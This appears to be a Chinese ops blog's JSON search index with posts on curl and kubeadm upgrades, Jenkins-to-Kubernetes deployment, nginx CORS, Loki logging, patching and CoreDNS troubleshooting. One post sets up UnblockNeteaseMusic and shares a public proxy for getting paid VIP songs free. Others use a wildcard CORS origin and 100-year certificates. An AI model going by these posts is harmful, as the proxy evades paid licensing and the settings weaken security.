ldaps pop3 pop3s rtsp scp sftp smb smbs smtp smtps telnet tftp Features: AsynchDNS GSS-API HTTP2 HTTPS-proxy IPv6 Kerberos Largefile libz Metalink NTLM NTLM_WB PSL SPNEGO SSL UnixSockets 更新 curl仓库升级太快libssh不用更新. 保持上面即可. libcurl-7.71.1-2.0.cf.rhel7.x86_64.rpm 上面的1.0直接404了.\nyum install http://www.city-fan.org/ftp/contrib/yum-repo/rhel7/x86_64/curl-7.71.1-2.0.cf.rhel7.x86_64.rpm \\ http://www.city-fan.org/ftp/contrib/yum-repo/rhel7/x86_64/libcurl-7.71.1-2.0.cf.rhel7.x86_64.rpm \\ http://www.city-fan.org/ftp/contrib/yum-repo/rhel7/x86_64/libssh2-1.9.0-5.0.cf.rhel7.x86_64.rpm -y ","permalink":"https://www.fenghong.tech/blog/ops/curl-data-raw/","tags":["curl","yum","libcurl","libssh2"],"title":"记一次curl版本yum升级至7.71.0"},{"categories":["ops","jenkins"],"contents":"[TOC]\n背景  基于springboot项目, 部署在kubernetes集群, 并实现自动化构建部署. 减轻开发的部署压力, 仅仅提交代码, 后续便由运维部署. 开发无需关心部署内在逻辑.\n 项目架构图 公司内部的k8s集群，主要跑的一个内部的crm系统，该系统的源码及构建管理使用的是gitlab+docker+maven, 代码测试用的sonarqube, 包管理使用的harbor, 部署使用的jenkins+kubernetes, 监控使用kube-prometheus, 日志使用loki, 配置中心使用nacos, 消息队列使用rabbitmq, 数据库使用mysql+redis\n整个访问链路内网使用nginx进行负载均衡代理至kubernetes的ingress. 因为需要外网介入访问, 我们这边使用了内网穿透frp进行穿透访问crm系统.\n项目构建 使用jenkins进行构建, 项目名称即为java的项目名称.\n源码管理SourceCode Management选择git, 填入项目的源码地址即可. build trigger\nbuild阶段使用mvn进行构建 mvn clean install -Dmaven.test.skip=true\n手写Dockerfile文件.\ncd $WORKSPACE/$JOB_BASE_NAME mvn clean package -Dmaven.test.skip=true cat \u0026gt;\u0026gt; $WORKSPACE/$JOB_BASE_NAME/target/Dockerfile \u0026lt;\u0026lt;EOF FROM harbor.youpenglai.cn/library/jre-8-alpine-bash:latest MAINTAINER louis \u0026lt;louis.hong@junhsue.com\u0026gt; WORKDIR /opt/ ADD $JOB_BASE_NAME.jar . CMD [ \u0026quot;bash\u0026quot;, \u0026quot;-c\u0026quot;, \u0026quot;java -Xmx512m -Xms512m -Xss256k -Xmn128m -Dspring.profiles.active=dev -Djava.security.egd=file:/dev/./urandom -jar /opt/$JOB_BASE_NAME.jar\u0026quot;] EOF 镜像打包及push阶段, 使用jenkins的docker-step插件.\n部署阶段 NAMESPACE=huohua REGISTRY=harbor.youpenglai.cn K8S_TOKEN='**********' ## 使用kubernetes的API进行部署 curl -X PATCH \\ -H \u0026quot;content-type: application/strategic-merge-patch+json\u0026quot; \\ -H \u0026quot;Authorization:Bearer $K8S_TOKEN\u0026quot; \\ -d '{\u0026quot;spec\u0026quot;:{\u0026quot;template\u0026quot;:{\u0026quot;spec\u0026quot;:{\u0026quot;containers\u0026quot;:[{\u0026quot;name\u0026quot;:\u0026quot;'${JOB_BASE_NAME}'\u0026quot;,\u0026quot;image\u0026quot;:\u0026quot;'${REGISTRY}'/'${NAMESPACE}'/'${JOB_BASE_NAME}':'${BUILD_NUMBER}'\u0026quot;}]}}}}' \\ \u0026quot;https://kuboard.youpenglai.com/k8s-api/apis/apps/v1/namespaces/${NAMESPACE}/deployments/svc-${JOB_BASE_NAME}\u0026quot; sleep 20s unset LabelSelector LabelSelector=\u0026quot;k8s.kuboard.cn/name=svc-${JOB_BASE_NAME},release=${JOB_BASE_NAME}\u0026quot; newPod=$(kubectl get po -l ${LabelSelector} -n ${NAMESPACE} | awk 'NR\u0026gt;1{print $1;exit}') [ -z $newPod ] \u0026amp;\u0026amp; exit kubectl logs --tail 100 $newPod -n ${NAMESPACE} ","permalink":"https://www.fenghong.tech/blog/ops/jenkins-java-docker-kubernetes/","tags":["git","jenkins","docker","kubernetes"],"title":"jenkins+java+docker+kubernetes实现自动化部署"},{"categories":["ops"],"contents":"[toc]\n前言  在开发静态页面时，类似Vue的应用，我们常会调用一些接口，这些接口极可能是跨域，然后浏览器就会报cross-origin问题不给调。\n最简单的解决方法，就是把浏览器设为忽略安全问题，设置\u0026ndash;disable-web-security。不过这种方式开发PC页面到还好，如果是移动端页面就不行了。\n当出现403跨域错误的时候 No 'Access-Control-Allow-Origin' header is present on the requested resource，需要给Nginx服务器配置响应的header参数.\n 解决 一般的配置nginx添加一下参数即可.\nlocation / { add_header Access-Control-Allow-Origin *; add_header Access-Control-Allow-Methods 'GET, POST, OPTIONS'; add_header Access-Control-Allow-Headers 'DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization'; if ($request_method = 'OPTIONS') { return 204; } }  Access-Control-Allow-Origin  服务器默认是不被允许跨域的。给Nginx服务器配置`Access-Control-Allow-Origin *`后，表示服务器可以接受所有的请求源（Origin）,即接受所有跨域的请求。 另一种解决思路 知道通常情况下，HTTPS引用HTTP的资源就会出现跨域错误，但今天我们的要求是允许它跨域，并且尽量保证它是基本安全的。\nlocation / { add_header Content-Security-Policy upgrade-insecure-requests; }  Content-Security-Policy  内容安全策略（CSP）需要仔细调整和精确定义策略。如果启用，CSP会对浏览器呈现页面的方式产生重大影响（例如，默认情况下禁用内联JavaScript，并且必须在策略中明确允许）。CSP可防止各种攻击，包括跨站点脚本和其他跨站点注入。\n","permalink":"https://www.fenghong.tech/blog/ops/nginx-blocked-by-cors/","tags":["nginx","CORS","http","ssl"],"title":"记一次nginx跨域访问Content Security Policy设置"},{"categories":["kubernetes"],"contents":"[TOC]\n 基本的集群监控部署已经完成, 但是整个集群的日志管理目前已经没有着落，基于loki实现了对整个集群的日志管理， 相对于efk， loki更加轻量化。 使用更便捷。\n 前置要求:\n 已经部署了NFS或者其他存储的K8s集群. 安装好helm  什么是Loki Loki是一个水平可扩展，高可用性，多租户的日志聚合系统，受到Prometheus的启发。它的设计非常经济高效且易于操作，因为它不会为日志内容编制索引，而是为每个日志流编制一组标签。官方介绍说到：Like Prometheus, but for logs.\n与其他日志聚合系统相比，Loki：\n  不对日志进行全文索引。通过存储压缩的非结构化日志和仅索引元数据，Loki操作更简单，运行更便宜。\n  索引和组使用与Prometheus已使用的相同标签记录流，使您可以使用与Prometheus已使用的相同标签在指标和日志之间无缝切换。\n  特别适合存放Kubernetes Pod日志; 诸如Pod标签之类的元数据会被自动删除和编入索引。\n  在Grafana有本机支持（已经包含在Grafana 6.0或更新版本中）。\n   Loki由3个组成部分组成：\n loki 是主服务器，负责存储日志和处理查询。 promtail 是代理，负责收集日志并将其发送给loki。 用户界面的Grafana。  示意图 部署Loki 基于helm部署loki， 我们先安装一下helm。\n$ wget https://get.helm.sh/helm-v3.2.4-linux-amd64.tar.gz $ tar xf helm-v3.2.4-linux-amd64.tar.gz \u0026amp;\u0026amp; mv linux-amd64/helm /usr/bin $ helm version version.BuildInfo{Version:\u0026quot;v3.2.4\u0026quot;, GitCommit:\u0026quot;0ad800ef43d3b826f31a5ad8dfbb4fe05d143688\u0026quot;, GitTreeState:\u0026quot;clean\u0026quot;, GoVersion:\u0026quot;go1.13.12\u0026quot;} 安装完成Helm后， 我们基于helm安装loki, 因为我们已经安装了grafana， 所以只需要安装一个loki加上promtail 。loki使用statefulset， promtail 使用daemonset。\n$ helm upgrade --install loki --namespace=monitoring loki/loki-stack Release \u0026quot;loki\u0026quot; does not exist. Installing it now. NAME: loki LAST DEPLOYED: Fri Jun 19 21:12:12 2020 NAMESPACE: monitoring STATUS: deployed REVISION: 1 NOTES: The Loki stack has been deployed to your cluster. Loki can now be added as a datasource in Grafana. See http://docs.grafana.org/features/datasources/loki/ for more detail. $ kubectl get pods -n monitoring | grep loki loki-0 0/1 Running 0 23s loki-promtail-ksrsn 1/1 Running 0 23s loki-promtail-ncs69 1/1 Running 0 23s loki-promtail-pz7hn 1/1 Running 0 23s loki-promtail-sxpkf 1/1 Running 0 23s 这样就已经部署完毕了。\nloki数据持久化 基于helm安装的没有数据持久化。 可以采用helm自定义的chart来进行数据持久化， 我这边提供一个简单的思路， 直接更改statefulset里面的数据卷挂载。 避免重新学习helmchart，给大家增加负担~~哈哈哈\n$ kubectl get statefulset loki -n monitoring -o yaml |grep -C 10 volumes -- restartPolicy: Always schedulerName: default-scheduler securityContext: fsGroup: 10001 runAsGroup: 10001 runAsNonRoot: true runAsUser: 10001 serviceAccount: loki serviceAccountName: loki terminationGracePeriodSeconds: 4800 volumes: - name: config secret: defaultMode: 420 secretName: loki - name: storage emptyDir： {} updateStrategy: type: RollingUpdate status: 这边看到是emptDir， 没有做storage。 首先， 我们创建一个pvc.我这边是基于nfs存储建立的， 如果是ceph或者其他分布式存储， 原理是一样的。\n$ cat loki-strorage.yaml --- apiVersion: v1 kind: PersistentVolumeClaim metadata: name: loki namespace: monitoring spec: accessModes: - ReadWriteMany resources: requests: storage: 200Gi storageClassName: nfs-23 $ kubectl apply -f loki-strorage.yaml 其次 ，将我们上面的statefulset/loki保存为yaml文件。\n$ kubectl get statefulset loki -n monitoring -o yaml \u0026gt;\u0026gt; loki-sf.yaml $ vim loki-sf.yaml ... volumes: - name: config secret: defaultMode: 420 secretName: loki - name: storage persistentVolumeClaim: ## 将emtypDir改成pvc， 名称是上面创建的。 claimName: loki ... $ kubectl apply -f loki-sf.yaml 至此， 大功告成。\n至于后面再grafana里面添加数据源就很简单了~~\nhttp://loki:3100 然后查看explor， 选择数据源为Loki，即可访问我们所有的pod日志了。 这里选择logs模式， metrics模式是不支持的。\n直接搜索会报错 Metrics mode does not support logs. Use an aggregation or switch to Logs mode. loki qury example 日志选择器  对于查询表达式的标签部分，将其用大括号括起来{}，然后使用键值语法选择标签。多个标签表达式用逗号分隔： = 完全相等。 != 不相等。 =~ 正则表达式匹配。 !~ 不进行正则表达式匹配。 # 根据任务名称来查找日志 {job=\u0026quot;xiaoke/svc-job-admin\u0026quot;} {job=\u0026quot;kube-system/kube-controller-manager\u0026quot;} {job=\u0026quot;nginx-ingress/nginx-ingress\u0026quot;} {namespace=\u0026quot;kube-system\u0026quot;,container=\u0026quot;kuboard\u0026quot;} 使用日志过滤器来查找 编写日志流选择器后，您可以通过编写搜索表达式来进一步过滤结果 |= 行包含字符串 != 行不包含字符串。 |~ 行匹配正则表达式。 !~ 行与正则表达式不匹配。 regex表达式接受RE2语法。默认情况下，匹配项区分大小写，并且可以将regex切换为不区分大小写的前缀(?i)。 1. 精确查找名称空间为kube-system下container为kuboard且包含有info关键字的日志 {namespace=\u0026quot;kube-system\u0026quot;,container=\u0026quot;kuboard\u0026quot;} |= \u0026quot;info\u0026quot; 2. 正则查找 {job=\u0026quot;huohua/svc-huohua-batch\u0026quot;} |~ \u0026quot;(duration|latency)s*(=|is|of)s*[d.]+\u0026quot; 3. 不包含。 {job=\u0026quot;mysql\u0026quot;} |= \u0026quot;error\u0026quot; != \u0026quot;timeout\u0026quot; LQ language可以参考官方\n参考  安装Kuboard 安装ingress-controller 安装nfs存储 kuberbetes 基于nfs的pvc.  ","permalink":"https://www.fenghong.tech/blog/kubernetes/kubernetes-loki-logs/","tags":["pvc","pv","nfs","nginxIngress","kubernetes","kuboard","loki"],"title":"k8s基于helm安装loki并持久化数据"},{"categories":["kubernetes"],"contents":"[TOC]\n 安装kubenetes1.18.0集群后, 发现最版本是v1.18.3, 所以有了这个升级, .0版本的问题有点多. 建议上statble版本, 不论是生产还是测试环境.\n 更新源 $ cat \u0026gt; /etc/yum.repos.d/kubernetes.repo \u0026lt; kubeadm-config-upgrade.yaml [kubernetes] name=Kubernetes baseurl=http://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64 enabled=1 gpgcheck=0 repo_gpgcheck=0 gpgkey=http://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg http://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg EOF 升级kubelet和kubeadm版本 重要: master和node节点都得升级\n### 查看可用源 $ yum list --showduplicates kubeadm --disableexcludes=kubernetes ### 安装v1.18.3版本 $ yum install kubelet-1.18.3 kubeadm-1.18.3 kubectl-1.18.3 -y ### 重启服务 $ systemctl daemon-reload \u0026amp;\u0026amp; systemctl restart kubelet 查看集群配置 $ kubeadm config view \u0026gt; kubeadm-config-upgrade.yaml 修改配置文件, 主要是两个字段kubernetesVersion: v1.18.3和imageRepository: registry.aliyuncs.com/k8sxio, 这里用的是张馆长的源.\n升级至最新版本 $ vim kubeadm-config-upgrade.yaml apiServer: certSANs: - 127.0.0.1 - apiserver.cluster.local - 192.168.0.31 - 10.103.97.2 extraArgs: authorization-mode: Node,RBAC feature-gates: TTLAfterFinished=true extraVolumes: - hostPath: /etc/localtime mountPath: /etc/localtime name: localtime pathType: File readOnly: true timeoutForControlPlane: 4m0s apiVersion: kubeadm.k8s.io/v1beta2 certificatesDir: /etc/kubernetes/pki clusterName: kubernetes controlPlaneEndpoint: apiserver.cluster.local:6443 controllerManager: extraArgs: experimental-cluster-signing-duration: 876000h feature-gates: TTLAfterFinished=true extraVolumes: - hostPath: /etc/localtime mountPath: /etc/localtime name: localtime pathType: File readOnly: true dns: type: CoreDNS etcd: local: dataDir: /var/lib/etcd imageRepository: registry.aliyuncs.com/k8sxio kind: ClusterConfiguration kubernetesVersion: v1.18.3 networking: dnsDomain: cluster.local podSubnet: 100.64.0.0/10 serviceSubnet: 10.96.0.0/12 scheduler: extraArgs: feature-gates: TTLAfterFinished=true extraVolumes: - hostPath: /etc/localtime mountPath: /etc/localtime name: localtime pathType: File readOnly: true ## 修改完成后, 比对一下差异 $ kubeadm upgrade diff --config kubeadm-config-upgrade.yaml 执行升级 ## 先干跑 dry-run , 测试一下 $ kubeadm upgrade apply -f --config kubeadm-config-upgrade.yaml --dry-run 升级至v1.18.3 $ kubeadm upgrade apply -f --config kubeadm-config-upgrade.yaml W0616 11:03:31.275157 23794 configset.go:202] WARNING: kubeadm cannot validate component configs for API groups [kubelet.config.k8s.io kubeproxy.config.k8s.io] [upgrade/config] Making sure the configuration is correct: W0616 11:03:31.287499 23794 common.go:94] WARNING: Usage of the --config flag for reconfiguring the cluster during upgrade is not recommended! W0616 11:03:31.289003 23794 configset.go:202] WARNING: kubeadm cannot validate component configs for API groups [kubelet.config.k8s.io kubeproxy.config.k8s.io] [preflight] Running pre-flight checks. [upgrade] Running cluster health checks [upgrade/version] You have chosen to change the cluster version to \u0026quot;v1.18.3\u0026quot; [upgrade/versions] Cluster version: v1.18.0 [upgrade/versions] kubeadm version: v1.18.3 [upgrade/prepull] Will prepull images for components [kube-apiserver kube-controller-manager kube-scheduler etcd] [upgrade/prepull] Prepulling image for component etcd. [upgrade/prepull] Prepulling image for component kube-apiserver. [upgrade/prepull] Prepulling image for component kube-controller-manager. [upgrade/prepull] Prepulling image for component kube-scheduler. [apiclient] Found 1 Pods for label selector k8s-app=upgrade-prepull-kube-controller-manager [apiclient] Found 1 Pods for label selector k8s-app=upgrade-prepull-etcd [apiclient] Found 1 Pods for label selector k8s-app=upgrade-prepull-kube-apiserver [apiclient] Found 1 Pods for label selector k8s-app=upgrade-prepull-kube-scheduler [upgrade/prepull] Prepulled image for component kube-apiserver. [upgrade/prepull] Prepulled image for component kube-controller-manager. [upgrade/prepull] Prepulled image for component kube-scheduler. [upgrade/prepull] Prepulled image for component etcd. [upgrade/prepull] Successfully prepulled the images for all the control plane components [upgrade/apply] Upgrading your Static Pod-hosted control plane to version \u0026quot;v1.18.3\u0026quot;... Static pod: kube-apiserver-k8s-master hash: e77d7ad5a9ffd5dcedfde09689852fa8 Static pod: kube-controller-manager-k8s-master hash: 55ac3d2123f8d2853aec1b91f6356fe8 Static pod: kube-scheduler-k8s-master hash: c4ab4fe810f1d424e4548c5a1a8d9408 [upgrade/etcd] Upgrading to TLS for etcd [upgrade/etcd] Non fatal issue encountered during upgrade: the desired etcd version for this Kubernetes version \u0026quot;v1.18.3\u0026quot; is \u0026quot;3.4.3-0\u0026quot;, but the current etcd version is \u0026quot;3.4.3\u0026quot;. Won't downgrade etcd, instead just continue [upgrade/staticpods] Writing new Static Pod manifests to \u0026quot;/etc/kubernetes/tmp/kubeadm-upgraded-manifests523692244\u0026quot; W0616 11:06:26.651289 23794 manifests.go:225] the default kube-apiserver authorization-mode is \u0026quot;Node,RBAC\u0026quot;; using \u0026quot;Node,RBAC\u0026quot; [upgrade/staticpods] Preparing for \u0026quot;kube-apiserver\u0026quot; upgrade [upgrade/staticpods] Renewing apiserver certificate [upgrade/staticpods] Renewing apiserver-kubelet-client certificate [upgrade/staticpods] Renewing front-proxy-client certificate [upgrade/staticpods] Renewing apiserver-etcd-client certificate [upgrade/staticpods] Moved new manifest to \u0026quot;/etc/kubernetes/manifests/kube-apiserver.yaml\u0026quot; and backed up old manifest to \u0026quot;/etc/kubernetes/tmp/kubeadm-backup-manifests-2020-06-16-11-06-21/kube-apiserver.yaml\u0026quot; [upgrade/staticpods] Waiting for the kubelet to restart the component [upgrade/staticpods] This might take a minute or longer depending on the component/version gap (timeout 5m0s) Static pod: kube-apiserver-k8s-master hash: e77d7ad5a9ffd5dcedfde09689852fa8 Static pod: kube-apiserver-k8s-master hash: e77d7ad5a9ffd5dcedfde09689852fa8 Static pod: kube-apiserver-k8s-master hash: 5063bb70bf194c1036ccebff991fbaab [apiclient] Found 1 Pods for label selector component=kube-apiserver [upgrade/staticpods] Component \u0026quot;kube-apiserver\u0026quot; upgraded successfully! [upgrade/staticpods] Preparing for \u0026quot;kube-controller-manager\u0026quot; upgrade [upgrade/staticpods] Renewing controller-manager.conf certificate [upgrade/staticpods] Moved new manifest to \u0026quot;/etc/kubernetes/manifests/kube-controller-manager.yaml\u0026quot; and backed up old manifest to \u0026quot;/etc/kubernetes/tmp/kubeadm-backup-manifests-2020-06-16-11-06-21/kube-controller-manager.yaml\u0026quot; [upgrade/staticpods] Waiting for the kubelet to restart the component [upgrade/staticpods] This might take a minute or longer depending on the component/version gap (timeout 5m0s) Static pod: kube-controller-manager-k8s-master hash: 55ac3d2123f8d2853aec1b91f6356fe8 Static pod: kube-controller-manager-k8s-master hash: 1ad23772d655e5cb3223c503b03ed2b2 [apiclient] Found 1 Pods for label selector component=kube-controller-manager [upgrade/staticpods] Component \u0026quot;kube-controller-manager\u0026quot; upgraded successfully! [upgrade/staticpods] Preparing for \u0026quot;kube-scheduler\u0026quot; upgrade [upgrade/staticpods] Renewing scheduler.conf certificate [upgrade/staticpods] Moved new manifest to \u0026quot;/etc/kubernetes/manifests/kube-scheduler.yaml\u0026quot; and backed up old manifest to \u0026quot;/etc/kubernetes/tmp/kubeadm-backup-manifests-2020-06-16-11-06-21/kube-scheduler.yaml\u0026quot; [upgrade/staticpods] Waiting for the kubelet to restart the component [upgrade/staticpods] This might take a minute or longer depending on the component/version gap (timeout 5m0s) Static pod: kube-scheduler-k8s-master hash: c4ab4fe810f1d424e4548c5a1a8d9408 Static pod: kube-scheduler-k8s-master hash: a3aa0a013314dd1f87b99ce93b006ffb [apiclient] Found 1 Pods for label selector component=kube-scheduler [upgrade/staticpods] Component \u0026quot;kube-scheduler\u0026quot; upgraded successfully! [upload-config] Storing the configuration used in ConfigMap \u0026quot;kubeadm-config\u0026quot; in the \u0026quot;kube-system\u0026quot; Namespace [kubelet] Creating a ConfigMap \u0026quot;kubelet-config-1.18\u0026quot; in namespace kube-system with the configuration for the kubelets in the cluster [kubelet-start] Downloading configuration for the kubelet from the \u0026quot;kubelet-config-1.18\u0026quot; ConfigMap in the kube-system namespace [kubelet-start] Writing kubelet configuration to file \u0026quot;/var/lib/kubelet/config.yaml\u0026quot; [bootstrap-token] configured RBAC rules to allow Node Bootstrap tokens to get nodes [bootstrap-token] configured RBAC rules to allow Node Bootstrap tokens to post CSRs in order for nodes to get long term certificate credentials [bootstrap-token] configured RBAC rules to allow the csrapprover controller automatically approve CSRs from a Node Bootstrap Token [bootstrap-token] configured RBAC rules to allow certificate rotation for all node client certificates in the cluster [addons] Applied essential addon: CoreDNS [addons] Applied essential addon: kube-proxy [upgrade/successful] SUCCESS! Your cluster was upgraded to \u0026quot;v1.18.3\u0026quot;. Enjoy! [upgrade/kubelet] Now that your control plane is upgraded, please proceed with upgrading your kubelets if you haven't already done so. 验证 在master上执行即可\n$ kubectl get nodes -o wide $ kubectl version $ kubeadm config view 证书相关升级 kubeadm自带的工具是1年证书过期. 时间太短.\n$ [root@k8s-master ~]# kubeadm alpha certs check-expiration [check-expiration] Reading configuration from the cluster... [check-expiration] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -oyaml' CERTIFICATE EXPIRES RESIDUAL TIME CERTIFICATE AUTHORITY EXTERNALLY MANAGED admin.conf Jun 16, 2021 03:06 UTC 364d no apiserver Jun 16, 2021 03:06 UTC 364d ca no apiserver-etcd-client Jun 16, 2021 03:06 UTC 364d etcd-ca no apiserver-kubelet-client Jun 16, 2021 03:06 UTC 364d ca no controller-manager.conf Jun 16, 2021 03:06 UTC 364d no etcd-healthcheck-client Jun 16, 2021 03:06 UTC 364d etcd-ca no etcd-peer Jun 16, 2021 03:06 UTC 364d etcd-ca no etcd-server Jun 16, 2021 03:06 UTC 364d etcd-ca no front-proxy-client Jun 16, 2021 03:06 UTC 364d front-proxy-ca no scheduler.conf Jun 16, 2021 03:06 UTC 364d no CERTIFICATE AUTHORITY EXPIRES RESIDUAL TIME EXTERNALLY MANAGED ca Jun 16, 2031 03:06 UTC 9y no etcd-ca Jun 16, 2031 03:06 UTC 9y no front-proxy-ca Jun 16, 2031 03:06 UTC 9y no 自己编译当前版本的kubeadm-v1.18.3.\n前提要求:\n go 1.14.3 环境 (我的go 版本是1.14.3, 建议不低于1.13.9) vim编辑器 最好是linux环境.  下载源码\n$ mkdir $GOPATH/src/k8s.io $ cd $GOPATH/src/k8s.io/ $ git clone https://gitee.com/louisehong/kubernetes.git $ cd kubernetes $ git checkout v1.18.3 查看源码得知, 所有的生成证书时间控制在 cmd/kubeadm/app/constants/constants.go这个文件的const变量CertificateValidity , 修改文件后, 重新编译kubeadm\n $ vim cmd/kubeadm/app/constants/constants.go // CertificateValidity defines the validity for all the signed certificates generated by kubeadm // 这里的时间再 乘 100 , 生成的证书时间即为100年. CertificateValidity = time.Hour * 24 * 365 * 100 只编译kubeadm $ make WHAT=cmd/kubeadm GOFLAGS=-v $ cp _output/bin/kubeadm /usr/bin/kubeadm 查看版本信息\n## 改了一个文件, 版本就是dirty了~ $ kubeadm version kubeadm version: \u0026amp;version.Info{Major:\u0026quot;1\u0026quot;, Minor:\u0026quot;18+\u0026quot;, GitVersion:\u0026quot;v1.18.3-dirty\u0026quot;, GitCommit:\u0026quot;2e7996e3e2712684bc73f0dec0200d64eec7fe40\u0026quot;, GitTreeState:\u0026quot;dirty\u0026quot;, BuildDate:\u0026quot;2020-06-16T12:07:09Z\u0026quot;, GoVersion:\u0026quot;go1.14.3\u0026quot;, Compiler:\u0026quot;gc\u0026quot;, Platform:\u0026quot;linux/amd64\u0026quot;} 备份以前的证书文件并更改集群证书时间. $ cp -r /etc/kubernetes/pki /etc/kubernetes/pki.bak ## 更新所有证书 $ kubeadm alpha certs renew all ## 查看证书过期时间. 发现有限期为100年了~~ $ # kubeadm alpha certs check-expiration [check-expiration] Reading configuration from the cluster... [check-expiration] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -oyaml' CERTIFICATE EXPIRES RESIDUAL TIME CERTIFICATE AUTHORITY EXTERNALLY MANAGED admin.conf May 23, 2120 12:14 UTC 99y no apiserver May 23, 2120 12:14 UTC 99y ca no apiserver-etcd-client May 23, 2120 12:14 UTC 99y etcd-ca no apiserver-kubelet-client May 23, 2120 12:14 UTC 99y ca no controller-manager.conf May 23, 2120 12:14 UTC 99y no etcd-healthcheck-client May 23, 2120 12:14 UTC 99y etcd-ca no etcd-peer May 23, 2120 12:14 UTC 99y etcd-ca no etcd-server May 23, 2120 12:14 UTC 99y etcd-ca no front-proxy-client May 23, 2120 12:14 UTC 99y front-proxy-ca no scheduler.conf May 23, 2120 12:14 UTC 99y no CERTIFICATE AUTHORITY EXPIRES RESIDUAL TIME EXTERNALLY MANAGED ca May 12, 2030 10:13 UTC 9y no etcd-ca May 12, 2030 10:13 UTC 9y no front-proxy-ca May 12, 2030 10:13 UTC 9y no 注意事项 如果是集群已经初始化了， ca证书的时间10年有效期是没有办法更新的， 如果有， 可以私信我， 相互学习一波。 楼主这边因为采用的是sealos安装的kubernetes高可以集群。导致ca证书是100年。 感谢老哥的指正。\n","permalink":"https://www.fenghong.tech/blog/kubernetes/kubernetes-upgrade-1.18.3/","tags":["kubernetes","upgrade","v1.18.3"],"title":"kubernetes集群升级至v1.18.3且调整证书年限"},{"categories":["server","ops"],"contents":"[TOC]\n 阿里云六月份的漏洞检测， 爆出了大量的高危漏洞\n$表示shell, #表示注释, \u0026gt; 表示 数据库\n 1：RHSA-2020:1176-低危: avahi 安全更新\nyum update avahi-libs -y 2：RHSA-2020:1022-低危: file 安全更新\nyum update file-libs -y 3：RHSA-2020:1138-低危: gettext 安全和BUG修复更新\nyum update gettext gettext-common-devel gettext-devel -y 4：RHSA-2020:1020-低危: curl 安全和BUG修复更新\nyum update libcurl-devel -y 5：RHSA-2020:1135-低危: polkit 安全和BUG修复更新\nyum update polkit -y 6：RHSA-2020:1011-中危: expat 安全更新\nyum update expat -y 7：RHSA-2020:1113-中危: bash 安全更新\nyum update bash -y 8：RHSA-2020:1190-中危: libxml2 安全更新\nyum update -y libxml2 9：RHSA-2020:1050-中危: cups 安全和BUG修复更新\nyum update cups-libs cups-client -y 10：RHSA-2020:1061-中危: bind 安全和BUG修复更新\nyum update bind-export-libs bind-libs-lite bind-license -y 11：RHSA-2020:0897-重要: icu 安全更新\nyum update libicu-devel libicu -y 12：RHSA-2020:1334-重要: telnet 安全更新\nyum update telnet -y 13：RHSA-2020:0850-中危: python-pip 安全更新\nyum update python3-pip python3 -y ","permalink":"https://www.fenghong.tech/blog/ops/aliyun-fix-bug-jun/","tags":["bug","fix"],"title":"阿里云6月bug修复"},{"categories":["tools"],"contents":"[TOC]\n 背景: 提高生活质量, 白嫖网易云vip歌曲.\n底层原理: 借用其他源替代网易云音乐源.\n 要求  linux服务器一台并且安装docker及docker-compose 懂一点网络的知识即可(配置代理)  配置UnblockNeteaseMusic服务端 安装docker环境及docker-compose, 启动服务即可. 假设服务器的ip为 192.168.0.23\n## 安装docker $ cd /etc/yum.repo.d/ \u0026amp;\u0026amp; wget https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo $ yum install docker-ce -y $ systemctl start docker \u0026amp;\u0026amp; systemctl enable docker ## 安装docker-compose $ sudo curl -L \u0026quot;https://github.com/docker/compose/releases/download/1.26.0/docker-compose-$(uname -s)-$(uname -m)\u0026quot; -o /usr/bin/docker-compose $ chmod +x /usr/bin/docker-compose $ cat \u0026gt; docker-compose.yml \u0026lt;\u0026lt;EOF version: '3' services: unblockneteasemusic: environment: NODE_ENV: production ports: - 18188:8080 EOF $ docker-compose up -d ## 出现下面即部署成功. $ ss -tnl |grep 18188 LISTEN 0 128 [::]:18188 [::]:* 配置客户端 windows的网易云音乐客户端配置, 点击确定重启客户端即可白嫖\u0026hellip;\n安卓手机设置\nWIFI -\u0026gt; 网络详情 -\u0026gt; 代理 -\u0026gt; 自动代理配置 -\u0026gt; http://192.168.0.23:18188/proxy.pac mac和ios手机设置大同小异.\n这里免费提供一下我的服务器的白嫖代理(不设置密码). 用过的可以评论一下~ tips: vip 歌曲下载完成后 关闭代理即可永久享用.\n手机端使用 http://fenghong.tech:15381/proxy.pac\n电脑端使用 http://fenghong.tech:15381\n","permalink":"https://www.fenghong.tech/blog/tools/unblockneteasemusic-docker-compose/","tags":["learning","UnblockNeteaseMusic"],"title":"白嫖网易云音乐vip~"},{"categories":["kubernetes"],"contents":"[TOC]\n 安装kubenetes1.18.0集群后，一次断电重启后， 在集群内解释不了内部命名空间等地址， 很奇怪， 这篇文章仅记录处理问题过程。\n 问题发现 安装监控系统Prometheus， 结合grafana图标展示， 后端一直报502. 很纳闷， 到数据源管理页面查看，prometheus数据一直加载不出来， http://prometheus-k8s.monitoring.svc:9090 点击测试test按钮， 一直显示500错误。 才想起来是内部的pod地址解析问题。\n由于博主grafana和Prometheus都安装了ingress，单体访问起来都没有问题。 所以也没有考虑grafana里面的数据问题， 直到我看了监控后，才发现数据源一直异常， 晕死~~\n解决思路  查看集群的svc名称解析是否可用 定位到具体问题  $ curl -I 10.96.0.10:53 curl: (7) Failed connect to 10.96.0.10:53; No route to host # coreDNS所在机器的 $ cat /etc/resolv.conf # Generated by NetworkManager nameserver 114.114.114.114 coredns连不上, 查看coredns相关节点是否异常\n$ kubectl get pods -n kube-system -o wide |grep coredns coredns-66bff467f8-9hjfd 1/1 Running 0 2d19h 100.87.166.173 server65 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; $ # kubectl get nodes -o wide NAME STATUS ROLES AGE VERSION INTERNAL-IP EXTERNAL-IP OS-IMAGE KERNEL-VERSION CONTAINER-RUNTIME huohua-test Ready \u0026lt;none\u0026gt; 9d v1.18.0 192.168.0.30 \u0026lt;none\u0026gt; CentOS Linux 7 (Core) 3.10.0-1062.9.1.el7.x86_64 docker://19.3.0 k8s-master Ready master 9d v1.18.0 192.168.0.31 \u0026lt;none\u0026gt; CentOS Linux 7 (Core) 3.10.0-1062.el7.x86_64 docker://19.3.0 server65 Ready \u0026lt;none\u0026gt; 5d18h v1.18.0 192.168.0.65 \u0026lt;none\u0026gt; CentOS Linux 7 (Core) 3.10.0-1062.el7.x86_64 